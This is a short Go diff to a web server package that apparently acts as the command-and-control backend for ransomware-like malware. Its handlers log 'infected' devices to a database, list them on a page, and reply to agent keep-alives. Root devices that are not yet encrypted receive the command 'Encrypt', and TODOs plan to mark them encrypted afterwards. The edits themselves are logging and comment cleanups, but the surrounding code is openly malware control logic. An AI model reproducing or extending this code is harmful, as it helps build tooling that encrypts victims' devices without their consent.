@@ -2,7 +2,6 @@ package Webserver
 
 import (
 	"encoding/json"
-	"fmt"
 	"html/template"
 	"io/ioutil"
 	"log"
@@ -54,9 +53,6 @@ func InfectedHandler(w http.ResponseWriter, r *http.Request) {
 		log.Printf("Issue inserting data into the database for device: %s \nwith error: %s", device.ID, err.Error())
 	}
 
-	//TODO: Change the insert function in DBconnect to check if ID has already been registered or not.
-	//TODO: Tidy up the error messages.
-
 }
 
 //user page to view enrolled devices
@@ -71,7 +67,7 @@ func ViewInfected(w http.ResponseWriter, r *http.Request) {
 	}
 	devices, err := Query(dbConnection)
 	if err != nil {
-		log.Println("Cannot connect to db ", err)
+		log.Println("Cannot query the db ", err)
 	}
 	t.Execute(w, devices)
 }
@@ -80,12 +76,13 @@ func CommandHandler(w http.ResponseWriter, r *http.Request) {
 	//Reads the header of the request and issue commands
 	//Tied to Agent.KeepAlive()
 
-	fmt.Printf("Device %s requesting commands \n", device.ID)
+	log.Printf("Device %s requesting commands \n", device.ID)
 	if device.User == "Root" && !device.Encrypted {
 		w.WriteHeader(http.StatusOK)
 		command := []byte("Encrypt")
 		w.Write(command)
-		//TODO: update device.Encrypted = true
+		//TODO: update device.Encrypted = true -- Update function
+		//err = update(device)
 
 	} else {
 		command := []byte("Wait")
